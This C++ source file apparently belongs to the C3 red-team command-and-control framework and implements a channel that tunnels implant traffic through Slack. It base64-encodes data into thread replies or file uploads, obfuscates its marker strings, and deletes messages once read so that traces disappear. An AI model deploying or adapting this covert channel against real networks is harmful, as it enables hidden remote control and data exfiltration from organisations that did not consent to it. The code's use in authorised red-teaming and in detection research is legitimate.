#include "Stdafx.h"
#include "Slack.h"
#include "Common/FSecure/Crypto/Base64.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Slack::Slack(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [slackToken, channelName] = arguments.Read<std::string, std::string>();
	m_slackObj = FSecure::Slack{ slackToken, channelName };
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Slack::OnSendToChannel(ByteView data)
{
	//Begin by creating a message where we can write the data to in a thread, both client and server ignore this message to prevent race conditions
	std::string updateTs = m_slackObj.WriteMessage(m_outboundDirectionName + OBF(":writing"));

	//this is more than 30 messages, send it as a file (we do this infrequently as file uploads restricted to 20 per minute).
	//Using file upload for staging (~88 messages) is a huge improvement over sending actual replies.
	size_t actualPacketSize = 0;
	if (data.size() > 120'000)
	{
		m_slackObj.UploadFile(cppcodec::base64_rfc4648::encode(data.data(), data.size()), updateTs);
		actualPacketSize = data.size();
	}
	else
	{
		//Write the full data into the thread. This makes it alot easier to read in onRecieve as slack limits messages to 40k characters.
		constexpr auto maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(40'000);
		actualPacketSize = std::min(maxPacketSize, data.size());
		auto sendData = data.SubString(0, actualPacketSize);

		m_slackObj.WriteReply(cppcodec::base64_rfc4648::encode(sendData.data(), sendData.size()), updateTs);
	}

	//Update the original first message with "C2S||S2C:Done" - these messages will always be read in onRecieve.
	std::string message = m_outboundDirectionName + OBF(":Done");

	m_slackObj.UpdateMessage(message, updateTs);
	return actualPacketSize;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Slack::OnReceiveFromChannel()
{
	auto messages = m_slackObj.GetMessagesByDirection(m_inboundDirectionName + OBF(":Done"));

	std::vector<ByteVector> ret;
	//Read the messages in reverse order (which is actually from the oldest to newest)
	//Avoids old messages being left behind.
	for (std::vector<std::string>::reverse_iterator ts = messages.rbegin(); ts != messages.rend(); ++ts)
	{

		auto replies = m_slackObj.ReadReplies(*ts);
		std::vector<std::string> repliesTs;

		std::string message;

		//Get all of the messages from the replies.
		for (auto&& reply : replies)
		{
			message.append(reply.second);
			repliesTs.emplace_back(std::move(reply.first)); //get all of the timestamps for later deletion
		}

		//Base64 decode the entire message
		auto relayMsg = cppcodec::base64_rfc4648::decode(message);
		m_slackObj.DeleteMessage(*ts);	//delete the message
		DeleteReplies(repliesTs); //delete the replies.
		ret.emplace_back(std::move(relayMsg));
	}
	return ret;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Slack::DeleteReplies(std::vector<std::string> const &repliesTs)
{
	for (auto&& ts : repliesTs)
		m_slackObj.DeleteMessage(ts);
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Slack::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Slack token",
				"min": 1,
				"description": "This token is what channel needs to interact with Slack's API"
			},
			{
				"type": "string",
				"name": "Channel name",
				"min": 4,
				"randomize": true,
				"description": "Name of Slack's channel used by api"
			}
		]
	},
	"commands": []
}
)_";
}
